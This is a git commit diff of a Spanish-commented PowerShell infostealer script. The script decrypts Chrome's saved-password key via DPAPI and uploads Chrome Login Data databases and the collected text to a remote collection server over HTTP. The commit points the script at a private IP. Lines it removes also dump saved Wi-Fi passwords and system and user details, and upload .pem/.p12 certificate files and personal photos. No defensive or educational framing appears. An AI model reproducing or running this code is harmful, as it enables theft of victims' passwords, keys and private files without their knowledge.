d18a28e2484bca1c5364f7c0bcc5ac2315342fce
Juan Saenz MITM <80866984+jndr332@users.noreply.github.com>
2025-03-16 13:41:39 -0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,55 +1,11 @@
-# Crear archivo donde se guardara toda la informacion extraida
 $cont = "$env:TEMP/data_msg.txt" 
-$server = "http://3.82.154.155:8082/"
-
-# INformación general del sistema 
-systeminfo | Where-Object { $_ -match "^(Nombre del sistema operativo|Versión del sistema operativo|Fabricante del sistema|Modelo del sistema|Dominio|Modelo el sistema|OS Name|OS Version|System Manufacturer|System Model|Domain):" } > $cont
-
-
-
-$whoami = whoami
-echo "whoami: $whoami" >> $cont
-
-#Obetener Usuarios y su estado
-Get-LocalUser | Select-Object "Name", "Enabled"  >> $cont
-
-
-# Interfaces e IPs
-
-							
-#Get-NetIPAddress | Where-Object { $_.IPAddress -match "\d+\.\d+\.\d+\.\d+" } | Select-Object InterfaceAlias, #IPAddress >> $cont
-
-Get-NetIPAddress | Where-Object { $_.IPAddress -match "\d+\.\d+\.\d+\.\d+" } | ForEach-Object {
-    "Interfaz: $($_.InterfaceAlias) - IP: $($_.IPAddress)"
-} >> $cont
-
-# IP publica
-$ip_publica = Invoke-RestMethod -Uri "https://api.ipify.org" 
-echo "IP PUBLICA: $ip_publica" >> $cont
-
-
-
-# Obtener redes wifi guardaras (SSID y Clave) 
-
-netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
-    $network = ($_ -split ":")[1].Trim()
-    $key = (netsh wlan show profile name="$network" key=clear | Select-String "Key Content").Line -split ":" | Select-Object -Last 1
-    if ($key) { Write-Output "$network : $key" }
-}>> $cont
-
-netsh wlan show profiles | Select-String "Perfil de usuario de todas" | ForEach-Object {
-    $network = ($_ -split ":")[1].Trim()
-    $key = (netsh wlan show profile name="$network" key=clear | Select-String "Contenido de la clave").Line -split ":" | Select-Object -Last 1
-    if ($key) { Write-Output "$network : $key" }
-} >> $cont
-
-
+$server = "http://192.168.3.50:8082/"
 
 
 # _______________ Extraccion de credenciales
  
 
-# LOCAL STATE ( archivo que contiene la clave para el descifrado)
+# LOCAL STATE ( archivo que contiene la clave de cifrado
 
 # Cargar el archivo Local State y obtener la clave cifrada
 $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
@@ -69,13 +25,12 @@ Add-Type -Path "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Security.
 $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
 
-# Convertir la clave binaria a un string base64 para guardarla o usarla más fácilmente
+# Convertir la clave binaria a base64
 $base64Key = [Convert]::ToBase64String($dpapiKey) 
 echo "PASSWORD: $base64Key" >> $cont
 
 
 #Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)
-
 $path = "$env:LOCALAPPDATA\Google\Chrome\User Data\"
 
 $profiles = Get-ChildItem $path | Where-Object { $_.Name -like "Profile*"} | Select-Object "Name"
@@ -91,37 +46,9 @@ else {
     Invoke-WebRequest -Uri "$server/upload_file/login_data_$env:USERNAME_default" -Method PUT -InFile $file_logins -ContentType "application/octet-stream"
 }
 
-# ENNVIO CONT
+# Envio de clave de cifrado
 Invoke-RestMethod -Uri "$server/receive_text" -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"
 
 
 
-
-# _______________________ Buscar y Enviar archivos .pem y .p12
-
-# Buscar archivos .pem y .p12 en la carpeta de Documentos
-$docsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Documents")
-$signFiles = Get-ChildItem -Path $docsPath -Include *.pem, *.p12 -Recurse
-
-if ($signFiles) {
-    foreach ($file in $signFiles) {
-        Invoke-WebRequest -Uri "$server/upload_file/$($file.Name)" -Method PUT -InFile $file.FullName -ContentType "application/octet-stream"
-    }
-} else {
-    Write-Host "No se encontraron archivos .pem o .p12 en la carpeta de Documentos."
-}
-
-# _______________________ Buscar y Enviar imágenes (3 fotos)
-
-# Buscar las primeras 3 imágenes en la carpeta de Imágenes
-$imagesPath = [System.IO.Path]::Combine($env:USERPROFILE, "Pictures")
-$imageFiles = Get-ChildItem -Path $imagesPath -Include *.jpg, *.jpeg, *.png -Recurse | Select-Object -First 3
-
-if ($imageFiles) {
-    foreach ($image in $imageFiles) {
-	Invoke-RestMethod -Uri "$server/upload_image" -Method POST -InFile $image.FullName -ContentType "application/octet-stream"
-	}
-} else {
-    Write-Host "No se encontraron imágenes en la carpeta de Imágenes."
-}
 
